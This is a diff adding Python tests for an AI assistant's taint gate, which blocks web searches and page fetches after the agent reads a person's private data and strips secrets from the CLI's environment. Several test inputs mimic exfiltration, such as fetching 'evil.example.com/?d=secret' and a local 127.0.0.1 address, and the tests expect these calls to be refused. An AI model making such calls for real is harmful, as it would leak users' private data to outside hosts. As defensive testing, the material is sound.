@@ -2,13 +2,22 @@
 
 from __future__ import annotations
 
+import json
+import shlex
 import sqlite3
+import subprocess
+import sys
 from pathlib import Path
 from typing import Any
 
 import pytest
 
+from alpha.connectors.base import Connections
 from alpha.mcp.tools import Tools
+from alpha.runtime import claude_account, claude_cli
+from alpha.runtime.claude_cli import RunResult, TurnRequest
+from alpha.runtime.turn import ask
+from alpha.world import taint
 from alpha.world.world import World
 
 URL = "https://www.linkedin.com/mynetwork/invite-connect/connections/"
@@ -113,3 +122,126 @@ def test_journal_rows_cannot_be_deleted_or_rewritten_only_forgotten(world: World
     assert world.journal.search("card") == []
     with pytest.raises(sqlite3.IntegrityError, match="append-only"):  # forgotten once, for good
         db.execute("UPDATE journal SET deleted_at = NULL WHERE id = ?", (jid,))
+
+
+# ---- 3. the taint rule: after private reads, nothing new leaves ----
+
+def said(world: World, text: str = "hello", thread: str | None = None) -> str:
+    return world.journal.append("said", text, actor="person", thread=thread)
+
+
+def test_private_reads_switch_web_search_and_fetch_off_for_the_run(world: World) -> None:
+    turn = said(world)
+    t = Tools(world, turn=turn)
+    search = {"tool_name": "WebSearch", "tool_input": {"query": "best calorie trackers"}}
+    assert taint.gate(world.store, turn, None, search) is None
+    t.collections_list()  # shapes and counts don't taint
+    assert taint.gate(world.store, turn, None, search) is None
+    t.facts_get()
+    refused = taint.gate(world.store, turn, None, search)
+    assert refused and "read what Alpha knows about people" in refused
+    fetch = {"tool_name": "WebFetch", "tool_input": {"url": "https://example.com/?q=secret"}}
+    assert taint.gate(world.store, turn, None, fetch)
+    assert taint.gate(world.store, "j_other", None, search) is None  # another run is clean
+
+
+def test_every_listed_read_taints(world: World) -> None:
+    for name in taint.READS:
+        assert hasattr(Tools, name), name
+    turn = said(world)
+    Tools(world, turn=turn).documents_list()
+    assert taint.reason(world.store, turn, None) == "read the person's documents"
+
+
+def test_a_thread_stays_tainted_because_its_session_resumes(world: World) -> None:
+    taint.mark(world.store, "j_a", "t_1", "read the calendar")
+    assert taint.reason(world.store, "j_b", "t_1") == "read the calendar"
+    assert taint.reason(world.store, "j_b", None) is None
+
+
+def test_the_gate_refuses_local_addresses_even_when_clean(world: World) -> None:
+    fetch = {"tool_name": "WebFetch", "tool_input": {"url": "http://127.0.0.1:53900/api/home"}}
+    assert "local network" in str(taint.gate(world.store, "j_1", None, fetch))
+
+
+def test_the_gate_hook_exits_2_to_refuse_and_fails_closed(world: World, tmp_path: Path) -> None:
+    turn = said(world)
+    req = TurnRequest(sentence="hi", system="", world_path=world.path, turn_id=turn)
+    command = claude_cli.gate_settings(req)["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
+    call = json.dumps({"tool_name": "WebSearch", "tool_input": {"query": "x"}})
+
+    def run(cmd: str) -> subprocess.CompletedProcess[str]:
+        return subprocess.run(cmd, shell=True, input=call, capture_output=True, text=True,
+                              timeout=60)
+
+    assert run(command).returncode == 0
+    taint.mark(world.store, turn, None, "read the calendar")
+    refused = run(command)
+    assert refused.returncode == 2 and "already read the calendar" in refused.stderr
+    broken = command.replace(shlex.quote(sys.executable), "/no/such/python", 1)
+    assert run(broken).returncode == 2
+
+
+def test_a_tainted_run_opens_only_sites_it_knows(world: World,
+                                                 monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr("alpha.connectors.browser.run_job", driver([]))
+    Connections(world.store).upsert("browser", "linkedin.com", status="connected")
+    t = Tools(world, turn=said(world, "compare my notes with jobs.example.org"))
+    assert "error" not in t.page_read("https://news.example.net/a")  # clean: anything opens
+    t.notes_list()
+    refused = t.page_read("https://evil.example.com/?d=secret")
+    assert "won't open example.com" in refused["error"]
+    assert "error" not in t.page_read("https://news.example.net/b")  # read before
+    assert "error" not in t.page_read("https://jobs.example.org/")  # named in the request
+    assert "error" not in t.page_read(URL)  # signed in
+    assert "error" in t.browser_signin("evil.example.com")
+
+
+def test_a_signed_in_page_taints_a_public_one_does_not(world: World,
+                                                       monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr("alpha.connectors.browser.run_job", driver([]))
+    turn = said(world)
+    t = Tools(world, turn=turn)
+    t.page_read("https://example.com/")
+    assert taint.reason(world.store, turn, None) is None
+    Connections(world.store).upsert("browser", "linkedin.com", status="connected")
+    t.page_read(URL)
+    assert taint.reason(world.store, turn, None) == taint.SIGNED_IN_PAGE
+
+
+def test_a_pre_pack_with_records_taints_the_turn_and_its_reply_the_next(world: World) -> None:
+    world.collections.create("food", "Food", [{"name": "item", "kind": "text"}])
+    world.collections.add("food", {"item": "boiled eggs"}, {"by": "person"})
+    seen: list[TurnRequest] = []
+
+    def runner(req: TurnRequest) -> RunResult:
+        seen.append(req)
+        return RunResult(reply="Done.", ok=True)
+
+    clean = ask(world, "what is a good protein target", runner=runner)
+    assert taint.reason(world.store, clean.said, None) is None
+    eggs = ask(world, "how many eggs did I log", runner=runner)
+    assert taint.reason(world.store, eggs.said, None) == "read the person's records"
+    assert world.journal.read(eggs.replied)["data"]["tainted"] == "read the person's records"
+    after = ask(world, "what is a good protein target", runner=runner)
+    assert "drew on private material" in str(taint.reason(world.store, after.said, None))
+
+
+# ---- 3b. the claude process: built-in tools, settings and environment ----
+
+def test_claude_gets_the_gate_and_only_the_environment_it_needs(
+        world: World, monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setenv("ALPHA_TOKEN", "secret-token")
+    monkeypatch.setenv("SOME_API_KEY", "secret-key")
+    monkeypatch.setenv("ALPHA_HOME", "/tmp/alpha-home")
+    monkeypatch.setenv("CLAUDE_CONFIG_DIR", "/tmp/private-config")
+    env = claude_account.child_env()
+    assert {"PATH", "HOME", "USER"} <= env.keys()
+    assert not {"ALPHA_TOKEN", "SOME_API_KEY", "ALPHA_HOME", "CLAUDE_CONFIG_DIR"} & env.keys()
+    req = TurnRequest(sentence="hi", system="", world_path=world.path, turn_id="j_1")
+    assert claude_cli.mcp_config(req)["mcpServers"]["alpha"]["env"]["ALPHA_HOME"] == (
+        "/tmp/alpha-home")
+    args = claude_cli.argv(req, Path("/tmp/mcp.json"))
+    settings = json.loads(args[args.index("--settings") + 1])
+    assert settings["hooks"]["PreToolUse"][0]["matcher"] == "WebSearch|WebFetch"
+    assert args[args.index("--setting-sources") + 1] == ""
